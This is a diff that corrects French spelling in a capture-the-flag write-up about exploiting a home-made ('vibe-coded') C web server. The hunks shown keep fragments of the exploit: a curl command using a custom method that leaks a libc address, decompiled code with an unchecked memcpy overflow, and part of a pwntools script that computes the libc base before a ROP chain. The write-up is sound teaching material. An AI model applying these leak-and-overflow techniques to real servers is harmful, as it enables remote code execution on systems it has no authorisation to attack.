@@ -1,11 +1,11 @@
 # Bocchi the vibe coder! : WriteUp
 
-*Hitori à décidé d'arreter la guitard électrique pour ce mettre au vibe coding et au lean management spé Jira + daily + retrospective bien solide afin d'assurer l'amélioration continue.*
+*Hitori a décidé d'arrêter la guitare électrique pour se mettre au vibe coding et au lean management spé Jira + daily + retrospective bien solide afin d'assurer l'amélioration continue.*
 
-*Lors de l'icebreaker d'usage le jour de son arrivé à slopTechInformatik elle demande :*
+*Lors de l'icebreaker d'usage le jour de son arrivée à slopTechInformatik elle demande :*
 
 *"Pourquoi utiliser Nginx quand je peux vibe coder mon propre serveur web ? En plus j'ai utilisé Sonnet 4.6 alors là ils ont aucune chance...*
-*Tu veux tester ? Ok mais je veux pas te donner le code source parce que j'imagine un modèle propriétaire autour du futur produit (avec un mode payant ou tu pourrais meme faire des POST !). Pour l'instant tu peux faire que des GET je suis en train de bosser sur les autres verb.*
+*Tu veux tester ? Ok mais je veux pas te donner le code source parce que j'imagine un modèle propriétaire autour du futur produit (avec un mode payant où tu pourrais même faire des POST !). Pour l'instant tu peux faire que des GET je suis en train de bosser sur les autres verbes.*
 
 *Tiens t'as la démo ici : URL*
 
@@ -132,7 +132,7 @@ void handle_bocchi(void *param_1,ulong param_2)
     send_all(local_48,0x40); // et on renvoie les 64 octets quasi non initialisés
 ```
 
-Un `BOCCHI` sans contenu renvoie donc un buffer presque vide de 64 octet contenant juste l'addr de stdout. C'est donc un leak partiellement controlé/simulé pour des raisons pédagogique :
+Un `BOCCHI` sans contenu renvoie donc un buffer presque vide de 64 octets contenant juste l'addr de stdout. C'est donc un leak partiellement contrôlé/simulé pour des raisons pédagogiques :
 
 ```bash
 $ curl -X BOCCHI localhost:8080/ --output result
@@ -140,7 +140,7 @@ $ curl -X BOCCHI localhost:8080/ --output result
 $ od -tx8 -N8 result
 0000000 000070d4b1bc0760
 
-# tx8 affiche en little indian et -N8 n'affiche que les 8 premiers octets qui contiennent l'addresse.
+# tx8 affiche en little endian et -N8 n'affiche que les 8 premiers octets qui contiennent l'adresse.
 ```
 
 C'est la première vraie difficulté : comprendre que ce dump contient une adresse libc exploitable, et pas juste du bruit.
@@ -156,7 +156,7 @@ void handle_get(void *param_1,ulong param_2)
   memcpy(local_108,param_1,param_2); // copie avant toute vérification de taille
 ```
 
-Le memcpy est fait avant toute vérifiaction de taille.
+Le memcpy est fait avant toute vérification de taille.
 
 ### Offset jusqu'à RIP
 
@@ -235,7 +235,7 @@ process = remote("127.0.0.1", 8080)
 # Leak libc
 process.send(b"BOCCHI /\n")
 process.recvuntil(b"\r\n\r\n")
-leak = u64(process.recv(8)) # on récupere les 8 premier octet
+leak = u64(process.recv(8)) # on récupère les 8 premiers octets
 libc.address = leak - libc.symbols["_IO_2_1_stdout_"]
 
 # ROP
